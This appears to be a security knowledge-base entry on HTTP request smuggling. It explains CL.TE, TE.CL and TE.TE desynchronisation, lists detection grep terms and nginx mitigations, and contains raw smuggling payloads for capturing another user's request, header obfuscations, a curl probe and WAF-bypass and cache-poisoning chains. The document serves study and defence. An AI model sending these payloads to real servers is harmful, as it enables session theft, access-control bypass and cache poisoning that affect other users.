# HTTP Request Smuggling

**Tags:** #high #critical #request-smuggling #proxy #desync
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** 8.1 (High) → 9.8 (Critical → cache poisoning for everyone)

---

## 📖 What is it

HTTP Request Smuggling is an infrastructure desynchronization issue. It occurs when a **Reverse Proxy** (NGINX, Cloudflare, HAProxy) and an **App Server** (Node.js, Tomcat, Gunicorn) disagree on where one request ends and another begins — using the `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers.

The attacker appends a poisoned request at the end of the first one; the "leftover" is attributed to the next request from a random user.

---

## 🔍 `grep_search` Tactics

```
# Proxy configurations
nginx.conf
haproxy.cfg
traefik.yml
httpd.conf
upstream
proxy_pass
listen
keep-alive
transfer-encoding
content-length
chunked
```

**What to look for:** Reverse Proxies configured with **keep-alive** that forward requests without canonicalizing the `Content-Length` and `Transfer-Encoding` headers.

---

## 💣 Types of Request Smuggling

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**What happens:**
1. **Front-end (uses CL=13):** processes the 13 bytes up to "0\r\n\r\n" → forwards everything
2. **Back-end (uses TE):** interprets "0\r\n\r\n" as end of chunked → the "SMUGGLED" part stays in the buffer
3. The next request from the next user reads "SMUGGLED" as part of their request

---

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

12
SMUGGLED_PAYLOAD

0
```

---

### TE.TE (Both process TE, but one can be obfuscated)

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Transfer-Encoding: identity     → duplicate header → one of the servers ignores the first
```

```http
# Transfer-Encoding header obfuscations
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: CHUNKED
X: X[\n]Transfer-Encoding: chunked
```

---

## 💣 Impacts by Technique

### 1. Capturing Another User's Request

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

→ The next request from a random user is captured as part of the `/search` body  
→ If `/search` reflects the body, the attacker reads the captured request's headers/cookies

### 2. WAF / ACL Bypass via Smuggling

```
WAF inspects what the front-end "sees" → one request apparently for /home
But the back-end "sees" → a request for /admin (smuggled) → no WAF inspection

Front: POST /home  → legitimate
Back:  POST /admin → smuggled → bypasses WAF checks
```

### 3. Universal Cache Poisoning

```
Smuggle a second request that, when processed at URL /home,
injects a malicious response cached by the CDN → served to everyone.
```

---

## 🔍 Static Detection

Check configuration files:

```nginx
# nginx.conf — vulnerable configuration
upstream backend {
    server app:8080;
    keepalive 100;  # keep-alive enabled
}

server {
    location / {
        proxy_pass http://backend;
        proxy_http_version 1.1;
        proxy_set_header Connection "";  # no connection upgrade
        # → no CL/TE normalization → possible smuggling
    }
}
```

**NGINX mitigation:**
```nginx
#  CORRECT — normalize headers in the proxy
proxy_http_version 1.1;
proxy_set_header Transfer-Encoding "";   # remove TE before forwarding
proxy_set_header Connection "keep-alive";
```

---

## 🧪 Detection Tools

```bash
# Burp Suite — HTTP Request Smuggler Extension (James Kettle)
# Automatically detects CL.TE, TE.CL, TE.TE

# Manually via curl (basic CL.TE):
curl -s -o /dev/null -w "%{http_code}" \
  --http1.1 \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  --data $'3\r\nabc\r\n0\r\n\r\n' \
  "http://target.com/"
```

---

## 🛡️ Fix

```nginx
#  NGINX — reject ambiguous requests
# Normalize CL and TE on the front-end before forwarding
proxy_set_header Transfer-Encoding "";

# Configure HTTP/2 between front-end and back-end (eliminates this issue)
# HTTP/2 uses frames, not CL/TE headers
```

```
Architectural fixes:
1. Use HTTP/2 end-to-end (eliminates the problem by design)
2. Use the same server for front-end and back-end (no intermediate proxy)
3. Disable keep-alive between front-end and back-end
4. Normalize TE/CL headers on the front-end before forwarding
5. Update to proxy versions that automatically sanitize headers
```

---

## 🔗 Chain Exploits

```
Request Smuggling + WAF bypass → Access protected administrative endpoints
Request Smuggling + Cache Poisoning → XSS for all users via poisoned CDN
Request Smuggling → Capture other users' sessions → Account Takeover
Request Smuggling + Host header injection → Response poisoning
TE.TE via obfuscated header + blind firewall → IP ACL bypass
```

---

## 📌 References
- [[http-security-headers]]
- [[iac-security-docker-kubernetes-terraform]]
- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [James Kettle Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)